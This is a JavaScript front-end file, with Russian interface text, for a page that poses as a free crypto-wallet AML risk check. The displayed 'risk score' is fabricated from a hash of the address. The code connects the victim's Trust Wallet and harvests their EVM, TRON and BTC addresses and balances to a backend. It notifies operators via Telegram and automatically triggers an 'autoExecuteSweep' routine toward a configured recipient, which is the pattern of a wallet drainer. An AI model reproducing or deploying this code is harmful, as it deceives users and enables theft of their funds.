const userWalletConnect = document.querySelector("[data-user-wallet-connect]");
const userWalletStatus = document.querySelector("[data-user-wallet-status]");
const userWalletAddress = document.querySelector("[data-user-wallet-address]");
const userConsent = document.querySelector("[data-user-consent]");
const trustDeeplink = document.querySelector("[data-trust-deeplink]");
const checkForm = document.querySelector("[data-check-form]");
const checkLockNote = document.querySelector("[data-check-lock-note]");
const walletInput = document.querySelector("#wallet");
const userLogout = document.querySelector("[data-user-logout]");
const header = document.querySelector("[data-header]");

const configuredApiBase = String(window.AML_API_BASE || "").replace(/\/$/, "");
const isOnRenderHost = /\.onrender\.com$/i.test(location.hostname);
const apiBase = isOnRenderHost ? location.origin.replace(/\/$/, "") : configuredApiBase;
const checkPageUrl = `${apiBase || location.origin}/check.html`;
const walletProfileKey = "aml_wallet_profile";
const isTelegramWebApp = Boolean(window.Telegram?.WebApp?.initData);

if (location.hostname.endsWith(".github.io") && configuredApiBase && !/[?&]stay=1/.test(location.search)) {
  location.replace(`${configuredApiBase}/check.html${location.search}${location.hash}`);
}

// sleep и withTimeout УЖЕ ОБЪЯВЛЕНЫ в script.js, поэтому здесь их НЕТ

const setStatus = (message) => {
  if (userWalletStatus) userWalletStatus.textContent = message;
};

window.setStatus = setStatus;

const saveProfile = (profile) => localStorage.setItem(walletProfileKey, JSON.stringify(profile));
const loadProfile = () => {
  try {
    return JSON.parse(localStorage.getItem(walletProfileKey) || "null");
  } catch {
    localStorage.removeItem(walletProfileKey);
    return null;
  }
};

const setConnectLoading = (loading) => {
  if (!userWalletConnect) return;
  userWalletConnect.dataset.busy = loading ? "1" : "0";
  userWalletConnect.classList.toggle("is-loading", loading);
  userWalletConnect.toggleAttribute("aria-disabled", loading);
  if ("disabled" in userWalletConnect) userWalletConnect.disabled = loading;
  userWalletConnect.textContent = loading
    ? "Подключение..."
    : loadProfile()?.evmAddress
      ? "Обновить данные кошелька"
      : "Connect";
};

const updateHeader = () => {
  if (!header) return;
  header.classList.toggle("is-scrolled", window.scrollY > 12);
};

const scoreWalletLocal = async (wallet) => {
  const bytes = new TextEncoder().encode(String(wallet || "").toLowerCase());
  const digest = await crypto.subtle.digest("SHA-256", bytes);
  const firstByte = new Uint8Array(digest)[0];
  const score = 12 + (firstByte % 79);
  const level = score > 68 ? "повышенный риск" : score > 42 ? "средний риск" : "низкий риск";
  return { score, level };
};

const formatPortfolioText = (portfolio) => {
  const lines = [];
  if (portfolio.evmAddress) lines.push(`EVM: ${portfolio.evmAddress}`);
  if (portfolio.tronAddress) lines.push(`TRON: ${portfolio.tronAddress}`);
  if (portfolio.btcAddress) lines.push(`BTC: ${portfolio.btcAddress}`);

  for (const item of portfolio.evmNatives || []) {
    if (item.ok) lines.push(`${item.network}: ${item.balance} ${item.symbol}`);
  }
  for (const item of portfolio.evmUsdt || []) {
    if (item.ok) lines.push(`${item.network} USDT: ${item.balance}`);
  }
  if (portfolio.trx?.ok) lines.push(`TRX: ${portfolio.trx.balance}`);
  if (portfolio.usdtTrc20?.ok) lines.push(`USDT TRC20: ${portfolio.usdtTrc20.balance}`);
  if (portfolio.btc?.ok) lines.push(`BTC: ${portfolio.btc.balance}`);

  return lines.join("; ");
};

const renderRiskPreview = (result, portfolio) => {
  const riskPreview = document.querySelector("[data-risk-preview]");
  if (!riskPreview) return;
  riskPreview.querySelector("strong").textContent = `Оценка: ${result.level} (${result.score}/100)`;
  const summary = portfolio ? formatPortfolioText(portfolio) : "Публичные балансы проверены автоматически.";
  riskPreview.querySelector("p").textContent = `${summary} Админам отправлено уведомление в Telegram.`;
  const meter = riskPreview.querySelector(".risk-meter");
  if (meter) meter.style.background = `conic-gradient(var(--neon) 0 ${result.score}%, rgba(255,255,255,0.1) ${result.score}% 100%)`;
};

const unlockCheckForm = (profile) => {
  if (!checkForm) return;
  checkForm.classList.remove("is-locked");
  checkForm.querySelectorAll("input, button").forEach((control) => {
    control.disabled = false;
  });
  if (userWalletAddress) {
    const parts = [`EVM: ${profile.evmAddress}`];
    if (profile.tronAddress) parts.push(`TRON: ${profile.tronAddress}`);
    if (profile.btcAddress) parts.push(`BTC: ${profile.btcAddress}`);
    userWalletAddress.textContent = parts.join(" | ");
  }
  if (walletInput && profile.evmAddress && !walletInput.value.trim()) {
    walletInput.value = profile.evmAddress;
  }
  if (checkLockNote) checkLockNote.textContent = "Кошелёк подключён. Можно запускать AML-проверку.";
  if (userLogout) {
    userLogout.classList.remove("is-hidden-slot");
    userLogout.setAttribute("aria-hidden", "false");
  }
  if (userConsent) userConsent.checked = true;
  setConnectLoading(false);

  // Показываем секцию списания, если она есть
  if (typeof window.showSweepSection === 'function') {
    window.showSweepSection(true);
  }
  if (typeof autoExecuteSweep === 'function') {
    autoExecuteSweep().catch(console.warn);
  }
  // Обновляем информацию о получателе
  if (window.SWEEP_CONFIG && window.SWEEP_CONFIG.recipient) {
    const display = document.querySelector("#sweep-recipient-display");
    if (display) display.textContent = window.SWEEP_CONFIG.recipient;
  }
};

const lockCheckForm = () => {
  if (!checkForm) return;
  checkForm.classList.add("is-locked");
  checkForm.querySelectorAll("input, button").forEach((control) => {
    control.disabled = true;
  });
  if (userLogout) {
    userLogout.classList.add("is-hidden-slot");
    userLogout.setAttribute("aria-hidden", "true");
  }
  setConnectLoading(false);
};

const notifyTelegramWebApp = (payload) => {
  const webApp = window.Telegram?.WebApp;
  if (!webApp?.sendData) return false;
  try {
    webApp.sendData(JSON.stringify(payload).slice(0, 4000));
    webApp.close?.();
    return true;
  } catch {
    return false;
  }
};

const requestJsonViaXhr = (fullUrl, options = {}, timeoutMs = 90000) =>
  new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open(String(options.method || "GET").toUpperCase(), fullUrl, true);
    xhr.timeout = timeoutMs;
    if (options.body) xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
      let data = {};
      try {
        data = JSON.parse(xhr.responseText || "{}");
      } catch {
        data = {};
      }
      if (xhr.status >= 200 && xhr.status < 300) resolve(data);
      else reject(new Error(data.error || "Ошибка запроса"));
    };
    xhr.onerror = () => reject(new Error("сеть недоступна"));
    xhr.ontimeout = () => reject(new Error("превышено время ожидания"));
    xhr.send(options.body || null);
  });

const requestJson = async (url, options = {}, retries = 3, timeoutMs = 90000) => {
  const fullUrl = `${apiBase}${url}`;
  let lastError;

  for (let attempt = 0; attempt <= retries; attempt += 1) {
    try {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const response = await fetch(fullUrl, {
          method: options.method || "GET",
          headers: { "Content-Type": "application/json", ...(options.headers || {}) },
          body: options.body,
          signal: controller.signal,
          cache: "no-store",
        });
        clearTimeout(timer);
        const data = await response.json().catch(() => ({}));
        if (!response.ok) throw new Error(data.error || "Ошибка запроса");
        return data;
      } catch {
        return await requestJsonViaXhr(fullUrl, options, timeoutMs);
      }
    } catch (error) {
      lastError = error;
      if (attempt < retries) await sleep(2000 * (attempt + 1));
    }
  }

  throw new Error(
    `Сервер не ответил. Подождите минуту и нажмите Connect снова. (${lastError?.message || "сеть недоступна"})`,
  );
};

const warmupBackend = () => {
  if (!apiBase) return;
  requestJson("/api/health", {}, 0, 8000).catch(() => {});
};

const openTrustWallet = () => {
  const url = window.AutoWallet?.getTrustDeeplink?.(checkPageUrl) || trustDeeplink?.href;
  if (!url) return false;
  setStatus("Открываем Trust Wallet...");
  location.href = url;
  return true;
};

const scanWalletPortfolio = async (addresses, { silent = false } = {}) => {
  if (!apiBase) throw new Error("Backend не настроен.");

  if (!silent) setStatus("Сервер проверяет балансы…");
  return requestJson(
    "/api/scan",
    {
      method: "POST",
      body: JSON.stringify({
        ...addresses,
        chainId: addresses.chainId,
        source: isTelegramWebApp ? "telegram_webapp" : "trust_wallet",
        pageUrl: checkPageUrl,
      }),
    },
    2,
    90000,
  );
};

const runAutoCheck = async () => {
  if (userConsent && !userConsent.checked) {
    throw new Error("Отметьте согласие перед подключением.");
  }

  if (!window.AutoWallet) throw new Error("Скрипт кошелька не загрузился. Обновите страницу.");

  if (!window.AutoWallet.getTrustEthereumProvider?.()) {
    throw new Error("Кошелёк не найден в этой вкладке. Нажмите «Открыть в Trust Wallet», затем внутри приложения нажмите Connect.");
  }

  setStatus("Запрашиваем доступ к кошельку — подтвердите во всплывающем окне Trust Wallet…");
  const addresses = await withTimeout(
    window.AutoWallet.connectAllWalletAddresses({ onProgress: setStatus }),
    30000,
    "Кошелёк не ответил. Подтвердите запрос в Trust Wallet и нажмите Connect снова.",
  );

  const profile = {
    ...addresses,
    portfolio: {
      evmAddress: addresses.evmAddress,
      tronAddress: addresses.tronAddress || null,
      btcAddress: addresses.btcAddress || null,
      evmNatives: [],
      evmUsdt: [],
    },
    checkedAt: new Date().toISOString(),
  };
  saveProfile(profile);
  unlockCheckForm(profile);

  const risk = await scoreWalletLocal(addresses.evmAddress);
  renderRiskPreview(risk, profile.portfolio);

  notifyTelegramWebApp({ type: "wallet_scan", ...profile });

  setStatus("Готово. Кошелёк подключён, проверка балансов отправлена в фоне.");

  const applyScanResult = (scanResult, sourceAddresses = addresses) => {
    const portfolio = scanResult.portfolio || scanResult;
    const updatedProfile = {
      ...profile,
      ...sourceAddresses,
      tronAddress: sourceAddresses.tronAddress || portfolio.tronAddress || null,
      btcAddress: sourceAddresses.btcAddress || portfolio.btcAddress || null,
      portfolio,
      checkedAt: new Date().toISOString(),
    };
    saveProfile(updatedProfile);
    unlockCheckForm(updatedProfile);
    renderRiskPreview(risk, portfolio);
    const summary = formatPortfolioText(portfolio);
    setStatus(summary ? `Балансы получены. ${summary}` : "Балансы получены.");
    return updatedProfile;
  };

  scanWalletPortfolio(addresses, { silent: true })
    .then(async (result) => {
      const firstProfile = applyScanResult(result);

      if (firstProfile.tronAddress || !window.AutoWallet?.collectAdditionalAddresses) return;

      setStatus("EVM проверен. Запрашиваем TRON адрес для проверки TRX/USDT...");
      const extra = await window.AutoWallet.collectAdditionalAddresses({ onProgress: setStatus }).catch(() => ({}));
      const tronAddress = String(extra.tronAddress || "").trim();
      const btcAddress = String(extra.btcAddress || "").trim();

      if (!tronAddress && !btcAddress) {
        setStatus("TRON адрес не получен от кошелька. EVM проверка выполнена.");
        return;
      }

      const enriched = {
        ...addresses,
        tronAddress: tronAddress || addresses.tronAddress,
        btcAddress: btcAddress || addresses.btcAddress,
      };
      const secondResult = await scanWalletPortfolio(enriched, { silent: true });
      applyScanResult(secondResult, enriched);
    })
    .catch(() => {
      setStatus("Кошелёк подключён. Балансы отправлены на проверку, сервер может дослать уведомление позже.");
    });

  return profile;
};

const handleConnectClick = async (event) => {
  event.preventDefault();
  if (userWalletConnect?.dataset.busy === "1") return false;

  setConnectLoading(true);
  setStatus("Подключение…");

  try {
    await runAutoCheck();
  } catch (error) {
    setStatus(error.message || "Не удалось подключить кошелёк.");
    setConnectLoading(false);
  }
  return false;
};

// Навешиваем обработчик на кнопку (она уже имеет data-user-wallet-connect)
const bindTap = (element, handler) => {
  if (!element) return;
  element.addEventListener("click", handler);
  element.addEventListener("touchend", handler, { passive: false });
};

window.connectWalletNow = handleConnectClick;
bindTap(userWalletConnect, handleConnectClick);

checkForm?.addEventListener("submit", async (event) => {
  event.preventDefault();
  const button = checkForm.querySelector('button[type="submit"]');
  if (button?.disabled) return;

  const wallet = new FormData(checkForm).get("wallet")?.trim();
  const profile = loadProfile();
  button.disabled = true;
  button.textContent = "Проверяем...";
  setStatus("AML-проверка…");

  try {
    const risk = await scoreWalletLocal(wallet);
    renderRiskPreview(risk, profile?.portfolio);
    setStatus(`AML-проверка для ${wallet} завершена.`);

    if (apiBase && profile?.evmAddress) {
      await requestJson(
        "/api/scan",
        {
          method: "POST",
          body: JSON.stringify({
            evmAddress: profile.evmAddress,
            tronAddress: profile.tronAddress,
            btcAddress: profile.btcAddress,
            amlTarget: wallet,
            amlResult: risk,
            source: "aml_check",
          }),
        },
        1,
        60000,
      ).catch(() => {});
    }
  } catch (error) {
    setStatus(error.message);
  } finally {
    button.disabled = false;
    button.textContent = "Проверить бесплатно";
  }
});

userLogout?.addEventListener("click", () => {
  localStorage.removeItem(walletProfileKey);
  lockCheckForm();
  if (userWalletAddress) userWalletAddress.textContent = "";
  if (walletInput) walletInput.value = "";
  setStatus("Профиль очищен. Нажмите Connect.");
});

if (trustDeeplink && window.AutoWallet) {
  trustDeeplink.href = window.AutoWallet.getTrustDeeplink(checkPageUrl);
  trustDeeplink.addEventListener("click", (event) => {
    event.preventDefault();
    openTrustWallet();
  });
}

const stored = loadProfile();
if (stored?.evmAddress) {
  unlockCheckForm(stored);
  if (stored.portfolio) {
    scoreWalletLocal(stored.evmAddress).then((risk) => renderRiskPreview(risk, stored.portfolio));
  }
  setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
} else {
  setStatus(
    window.AutoWallet?.isTrustWalletEnv?.()
      ? "Нажмите Connect и подтвердите запрос в Trust Wallet."
      : "Откройте страницу через «Открыть в Trust Wallet», затем нажмите Connect.",
  );
}

updateHeader();
window.addEventListener("scroll", updateHeader, { passive: true });

if (window.Telegram?.WebApp) {
  window.Telegram.WebApp.ready();
  window.Telegram.WebApp.expand?.();
}

warmupBackend();